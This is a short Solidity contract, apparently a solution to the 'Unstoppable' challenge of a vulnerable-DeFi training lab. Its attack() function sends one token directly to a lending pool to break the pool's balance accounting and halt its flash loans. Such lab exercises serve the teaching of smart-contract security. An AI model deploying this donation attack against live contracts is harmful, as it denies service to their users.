pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract UnstoppableAttacker {
    address private pool; 
    IERC20 private token;
    constructor(address poolAddress, address tokenAddress) {
        pool = poolAddress;
        token = IERC20(tokenAddress);
    }

    function attack() public {
        token.transferFrom(msg.sender, pool, 1);
    }
}